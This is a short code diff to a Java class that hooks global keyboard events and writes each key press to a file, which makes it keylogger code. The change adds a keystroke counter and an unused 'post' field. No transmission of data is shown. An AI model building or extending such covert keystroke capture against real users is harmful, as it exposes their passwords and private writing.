@@ -11,6 +11,9 @@ import java.awt.event.ActionListener;
  */
 public class KS implements ActionListener, NativeKeyListener {
 
+    String post;
+    int typeCounter = 0;
+
     @Override
     public void actionPerformed(ActionEvent actionEvent) {
     }
@@ -21,6 +24,7 @@ public class KS implements ActionListener, NativeKeyListener {
         if (!NativeKeyEvent.getKeyText( nativeKeyEvent.getKeyCode()).equals("Undefined")){
             Writer w=new Writer();
             w.WriteToFile(NativeKeyEvent.getKeyText( nativeKeyEvent.getKeyCode()));
+            typeCounter++;
         }
 
     }
@@ -35,6 +39,7 @@ public class KS implements ActionListener, NativeKeyListener {
         if (!NativeKeyEvent.getKeyText( nativeKeyEvent.getKeyCode()).equals("Undefined")){
             Writer w=new Writer();
             w.WriteToFile(NativeKeyEvent.getKeyText( nativeKeyEvent.getKeyCode()));
+            typeCounter++;
         }
     }
 
